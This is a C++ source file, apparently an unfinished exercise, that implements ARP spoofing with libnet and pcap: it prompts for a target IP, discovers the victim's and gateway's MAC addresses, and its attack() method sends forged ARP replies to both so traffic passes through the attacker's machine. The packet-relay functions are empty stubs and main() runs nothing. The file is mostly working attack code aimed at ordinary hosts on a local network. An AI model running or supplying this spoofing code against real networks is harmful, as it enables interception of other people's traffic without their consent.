#include <iostream>
#include <libnet.h>
#include <unistd.h>
#include <pcap.h>
#include <wait.h>
#include <thread>

using namespace std;


class arp_info{

private:

   static u_int32_t ip_addr_gateway;//gateway_ip
   static u_int32_t ip_addr_atacker;//attacker_ip
   static u_int32_t ip_addr_victim;//victim_ip
    u_int8_t *mac_addr_victim;//victim_mac
    u_int8_t *mac_addr_attacker;//attacker_mac
    u_int8_t *mac_addr_gateway;
    libnet_t *handle;
    u_int8_t *broad;
    int z=100;

    char *gate(char* buf);
    const u_char *packet;
    pcap_t *p_handle;
    struct pcap_pkthdr *header;
public:

    void get_gateway()
    {
        FILE *pFile = NULL;
        char strTemp[255];
           pFile = fopen( "/proc/net/arp", "r" );
           if( pFile != NULL )
           {
            //arp_table second colrom is gateway
               fgets( strTemp, sizeof(strTemp), pFile );
               fgets( strTemp, sizeof(strTemp), pFile );
               fclose( pFile );
           }
           else
            printf("Can't open arp table\n");
           char *list;
           list=strtok(strTemp," ");
           ip_addr_gateway=inet_addr(list);
           cout<<"gateway:"<<list<<endl;
    }

    void arp_init()
    {
        char errbuf[LIBNET_ERRBUF_SIZE];//error buf about LIBNET
        if((handle=libnet_init(LIBNET_LINK_ADV,NULL,errbuf))==NULL)
        {
            printf("error:%s\n",errbuf);
            return ;
        }
        //get attacker ip
        char ip_addr_str[16];
        printf("Input target ip:\n");
        fgets(ip_addr_str,16,stdin);

        ip_addr_victim=inet_addr(ip_addr_str);//assign victim ip
        mac_addr_attacker=libnet_get_hwaddr(handle)->ether_addr_octet;//get attacker mac
        ip_addr_atacker=libnet_get_ipaddr4(handle);//get attacker ip
        get_gateway();//get gateway ip&mac
        printf("target:%s\n",ip_addr_str);
        get_victim_mac();//get victim mac
        get_gateway_mac();

    }



    int arp(u_int8_t option,libnet_t *handle,u_int32_t ip_addr_s,u_int32_t ip_addr_d,u_int8_t *mac_addr_s, u_int8_t *mac_addr_d)
    {
        libnet_ptag_t arp;
        //build ARP and ethernet
        arp=libnet_autobuild_arp(option,mac_addr_s,(u_int8_t*)&ip_addr_s,mac_addr_d,(u_int8_t*)&ip_addr_d,handle);

        if(arp==-1)
        {
            printf("ARP_Error\n");
            return 2;
        }
        arp=libnet_autobuild_ethernet(mac_addr_d,ETHERTYPE_ARP,handle);
        if(arp==-1)
        {
            printf("Ether_Error\n");
            return 2;
        }
        libnet_write(handle);
       // libnet_destroy(handle);

        return 0;
    }



    void get_victim_mac()//send broad cast and receive the packet about victim
    {

        u_int32_t ip_addr_tmp=ip_addr_victim;
        printf("ip_addr_tmp: %X %X %X %X",((u_int8_t*)&ip_addr_tmp)[0],((u_int8_t*)&ip_addr_tmp)[1],((u_int8_t*)&ip_addr_tmp)[2],((u_int8_t*)&ip_addr_tmp)[3]);
      //  printf("finish victimzzzz\n");
        unsigned char cast[]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        if(arp(ARPOP_REQUEST,handle,libnet_get_ipaddr4(handle),ip_addr_victim,libnet_get_hwaddr(handle)->ether_addr_octet,cast)==2)
               printf("\n Fail to get victim_mac\n");

        char *dev,error_buf[PCAP_ERRBUF_SIZE];
        dev=pcap_lookupdev(error_buf);//search device
        if(dev==NULL)
        {
            fprintf(stderr,"No such device:%s\n",error_buf);
            return ;
        }

        struct libnet_ethernet_hdr *e_hdr;

        p_handle=pcap_open_live(dev,1000,0,1000,error_buf); //dev open

        while(true)
        {
            if(arp(ARPOP_REQUEST,handle,libnet_get_ipaddr4(handle),ip_addr_victim,libnet_get_hwaddr(handle)->ether_addr_octet,cast)==2)
                   printf("\n Fail to get victim_mac\n");
            printf("checking mac....\n");

            pcap_next_ex(p_handle,&header,&packet);

            e_hdr=(struct libnet_ethernet_hdr *)packet;
            if(ntohs(e_hdr->ether_type)==ETHERTYPE_ARP)
            {
                //for(int i=0;i<42;i++){
                //    printf("%02x ",packet[i]);
                //}
                u_int32_t tmp=((u_int32_t*)(packet+28))[0];
               // printf("tmp: %X %X %X %X\n",((u_int8_t*)&tmp)[0],((u_int8_t*)&tmp)[1],((u_int8_t*)&tmp)[2],((u_int8_t*)&tmp)[3]);
               // printf("ip_addr_tmp: %X %X %X %X\n",((u_int8_t*)&ip_addr_tmp)[0],((u_int8_t*)&ip_addr_tmp)[1],((u_int8_t*)&ip_addr_tmp)[2],((u_int8_t*)&ip_addr_tmp)[3]);
                if(tmp==ip_addr_tmp)
                {
                    mac_addr_victim=(u_int8_t*)(packet+22);
                    printf("%02X %02X %02X %02X %02X %02X\n",mac_addr_victim[0],mac_addr_victim[1],mac_addr_victim[2],mac_addr_victim[3],mac_addr_victim[4],mac_addr_victim[5]);
                    break;
                }
                   // printf("xxx: %X %X %X %X",((u_int8_t*)&tmp)[0],((u_int8_t*)&tmp)[1],((u_int8_t*)&tmp)[2],((u_int8_t*)&tmp)[3]);

            }


        }
        pcap_close(p_handle);
    }

    void get_gateway_mac()
    {
        u_int32_t ip_addr_tmp=ip_addr_gateway;
        printf("ip_addr_tmp: %X %X %X %X",((u_int8_t*)&ip_addr_tmp)[0],((u_int8_t*)&ip_addr_tmp)[1],((u_int8_t*)&ip_addr_tmp)[2],((u_int8_t*)&ip_addr_tmp)[3]);
      //  printf("finish victimzzzz\n");
        unsigned char cast[]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        if(arp(ARPOP_REQUEST,handle,libnet_get_ipaddr4(handle),ip_addr_gateway,libnet_get_hwaddr(handle)->ether_addr_octet,cast)==2)
               printf("\n Fail to get victim_mac\n");

        char *dev,error_buf[PCAP_ERRBUF_SIZE];
        dev=pcap_lookupdev(error_buf);//search device
        if(dev==NULL)
        {
            fprintf(stderr,"No such device:%s\n",error_buf);
            return ;
        }

        struct libnet_ethernet_hdr *e_hdr;

        p_handle=pcap_open_live(dev,1000,0,1000,error_buf); //dev open

        while(true)
        {
            if(arp(ARPOP_REQUEST,handle,libnet_get_ipaddr4(handle),ip_addr_gateway,libnet_get_hwaddr(handle)->ether_addr_octet,cast)==2)
                   printf("\n Fail to get victim_mac\n");
            printf("checking mac....\n");

            pcap_next_ex(p_handle,&header,&packet);

            e_hdr=(struct libnet_ethernet_hdr *)packet;
            if(ntohs(e_hdr->ether_type)==ETHERTYPE_ARP)
            {
                //for(int i=0;i<42;i++){
                //    printf("%02x ",packet[i]);
                //}
                u_int32_t tmp=((u_int32_t*)(packet+28))[0];
               // printf("tmp: %X %X %X %X\n",((u_int8_t*)&tmp)[0],((u_int8_t*)&tmp)[1],((u_int8_t*)&tmp)[2],((u_int8_t*)&tmp)[3]);
               // printf("ip_addr_tmp: %X %X %X %X\n",((u_int8_t*)&ip_addr_tmp)[0],((u_int8_t*)&ip_addr_tmp)[1],((u_int8_t*)&ip_addr_tmp)[2],((u_int8_t*)&ip_addr_tmp)[3]);
                if(tmp==ip_addr_tmp)
                {
                    mac_addr_gateway=(u_int8_t*)(packet+22);
                    printf("%02X %02X %02X %02X %02X %02X\n",mac_addr_gateway[0],mac_addr_gateway[1],mac_addr_gateway[2],mac_addr_gateway[3],mac_addr_gateway[4],mac_addr_gateway[5]);
                    break;
                }
                   // printf("xxx: %X %X %X %X",((u_int8_t*)&tmp)[0],((u_int8_t*)&tmp)[1],((u_int8_t*)&tmp)[2],((u_int8_t*)&tmp)[3]);

            }


        }
        pcap_close(p_handle);
    }

    void attack()
    {
        if(arp(ARPOP_REPLY,handle,ip_addr_gateway,ip_addr_victim,mac_addr_attacker,mac_addr_victim)==2)//attack victim
               printf("\n Fail to get victim_mac\n");
        if(arp(ARPOP_REPLY,handle,ip_addr_victim,ip_addr_gateway,mac_addr_attacker,mac_addr_gateway)==2)//attack gateway
               printf("\n Fail to get victim_mac\n");
        printf("\n Attack...\n");
    }

    void set_gateway_ip(char *ip_addr_str)
    {
        ip_addr_gateway=inet_addr(ip_addr_str);
    }


    void gateway_relay()
    {

        const u_char *packet;
        pcap_t *p_handle;
        struct pcap_pkthdr *header;

        char *dev,error_buf[PCAP_ERRBUF_SIZE];
        dev=pcap_lookupdev(error_buf);//search device
        if(dev==NULL)
        {
            fprintf(stderr,"No such device:%s\n",error_buf);
            return ;
        }

        struct libnet_ethernet_hdr *e_hdr;

        p_handle=pcap_open_live(dev,1000,0,1000,error_buf); //dev open

        while(true)
        {
            libnet_ipv4_hdr *ipv_hdr;
            pcap_next_ex(p_handle,&header,&packet);
            e_hdr=(struct libnet_ethernet_hdr *)packet;
            ipv_hdr=(struct libnet_ipv4_hdr*)(packet+sizeof(struct libnet_ethernet_hdr));

            if(ipv_hdr->ip_dst.s_addr==ip_addr_atacker)
            {
                if(ipv_hdr->ip_src.s_addr==ip_addr_gateway)//gateway->me->victim
                {
                    //p=libnet_autobuild_ethernet(ip_addr_victim,ETHERTYPE_IP,handle);
                    //libnet_adv_write_link()
                }

            }


        }
        pcap_close(p_handle);



    }

    void victim_relay()//victim->attacker->gateway
    {

        const u_char *packet;
        pcap_t *p_handle;
        struct pcap_pkthdr *header;

        char *dev,error_buf[PCAP_ERRBUF_SIZE];
        dev=pcap_lookupdev(error_buf);//search device
        if(dev==NULL)
        {
            fprintf(stderr,"No such device:%s\n",error_buf);
            return ;
        }

        struct libnet_ethernet_hdr *e_hdr;

        p_handle=pcap_open_live(dev,1000,0,1000,error_buf); //dev open

        while(true)
        {
            libnet_ipv4_hdr *ipv_hdr;
            pcap_next_ex(p_handle,&header,&packet);
            e_hdr=(struct libnet_ethernet_hdr *)packet;
            ipv_hdr=(struct libnet_ipv4_hdr*)(packet+sizeof(struct libnet_ethernet_hdr));

            if(ipv_hdr->ip_dst.s_addr==ip_addr_victim)
            {
                if(e_hdr->ether_shost==mac_addr_victim)//victim->me->gateway
                {
                    //p=libnet_autobuild_ethernet(ip_addr_gateway,ETHERTYPE_IP,handle);
                }
            }


        }
        pcap_close(p_handle);


    }
    void test1(){
        for(int i=0;i<10;i++)
        {
            sleep(1);
            z=z-i;
            cout<<"test1:"<<z<<endl;
        }
    }
    void test2(){
        for(int i=0;i<10;i++)
        {
            z=z+i;
            cout<<"test2:"<<z<<endl;
        }
    }

    void relay(){
        std::thread gateway([&](){test1();});

        std::thread victim([&]{test2();});
        //printf("zz");
        gateway.join();
        victim.join();

    }

};

u_int32_t arp_info::ip_addr_gateway=0;
u_int32_t arp_info::ip_addr_atacker=0;
u_int32_t arp_info::ip_addr_victim=0;

int main(void)
{
    arp_info test;
    //test.relay();
    //test.arp_init();
   // thread a(&test.gateway_relay);
   // a.join();



    return 0;
}
